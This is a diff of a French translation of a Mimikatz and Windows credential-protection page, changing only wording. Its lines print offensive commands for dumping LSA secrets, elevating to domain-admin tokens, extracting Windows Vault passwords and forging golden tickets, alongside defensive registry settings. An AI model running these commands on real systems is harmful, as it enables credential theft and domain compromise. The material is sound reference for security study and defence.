@@ -10,8 +10,8 @@ Depuis Windows 8.1 et Windows Server 2012 R2, des mesures significatives ont ét
 
 - **Les hachages LM et les mots de passe en clair** ne sont plus stockés en mémoire pour améliorer la sécurité. Un paramètre de registre spécifique, _HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest "UseLogonCredential"_, doit être configuré avec une valeur DWORD de `0` pour désactiver l'authentification Digest, garantissant que les mots de passe "en clair" ne sont pas mis en cache dans LSASS.
 
-- **La protection LSA** est introduite pour protéger le processus de l'Autorité de Sécurité Locale (LSA) contre la lecture non autorisée de la mémoire et l'injection de code. Cela est réalisé en marquant le LSASS comme un processus protégé. L'activation de la protection LSA implique :
-1. Modifier le registre à _HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa_ en définissant `RunAsPPL` à `dword:00000001`.
+- **La protection LSA** est introduite pour protéger le processus de l'Autorité de Sécurité Locale (LSA) contre la lecture non autorisée de la mémoire et l'injection de code. Cela est réalisé en marquant LSASS comme un processus protégé. L'activation de la protection LSA implique :
+1. Modifier le registre à _HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa_ en définissant `RunAsPPL` sur `dword:00000001`.
 2. Mettre en œuvre un objet de stratégie de groupe (GPO) qui impose ce changement de registre sur les appareils gérés.
 
 Malgré ces protections, des outils comme Mimikatz peuvent contourner la protection LSA en utilisant des pilotes spécifiques, bien que de telles actions soient susceptibles d'être enregistrées dans les journaux d'événements.
@@ -131,7 +131,7 @@ mimikatz "kerberos::golden /domain:child.example.com /sid:S-1-5-21-123456789-123
 
 - `mimikatz "lsadump::lsa /inject" exit`
 
-- **LSADUMP::NetSync** : Usurper un DC en utilisant les données de mot de passe d'un compte d'ordinateur.
+- **LSADUMP::NetSync** : Imiter un DC en utilisant les données de mot de passe d'un compte d'ordinateur.
 
 - _Aucune commande spécifique fournie pour NetSync dans le contexte original._
 
@@ -180,7 +180,7 @@ mimikatz "kerberos::golden /domain:child.example.com /sid:S-1-5-21-123456789-123
 - Ajouter : `mimikatz "sid::add /user:targetUser /sid:newSid" exit`
 - Modifier : _Aucune commande spécifique pour modifier dans le contexte original._
 
-- **TOKEN::Elevate** : Usurper des jetons.
+- **TOKEN::Elevate** : Imiter des jetons.
 - `mimikatz "token::elevate /domainadmin" exit`
 
 ### Services Terminal
@@ -194,7 +194,7 @@ mimikatz "kerberos::golden /domain:child.example.com /sid:S-1-5-21-123456789-123
 
 ### Coffre-fort
 
-- Extraire des mots de passe du Windows Vault.
+- Extraire des mots de passe du Coffre Windows.
 - `mimikatz "vault::cred /patch" exit`
 
 
